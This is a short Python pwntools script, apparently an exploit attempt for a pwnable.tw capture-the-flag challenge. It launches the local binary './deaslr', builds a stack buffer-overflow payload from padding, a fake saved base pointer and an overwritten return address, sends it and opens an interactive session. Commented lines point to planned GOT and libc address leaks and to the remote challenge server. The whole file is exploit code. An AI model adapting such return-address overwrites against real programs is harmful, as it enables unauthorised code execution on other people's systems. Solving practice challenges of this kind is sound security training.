from pwn import *


r = process("./deaslr")
# r = remote("chall.pwnable.tw", 10402)
# libc = ELF('libc_64.so.6')
# chall = ELF('./unexploitable')


# bss = chall.bss()
# read_got = chall.got['read']
# sleep_got = chall.got['sleep']
# main_addr = chall.symbols['main']
input("@")
payload = b'a'*0x10 + p64(0xdeadbeef) + p64(0x4005be)
r.sendline(payload)
r.interactive()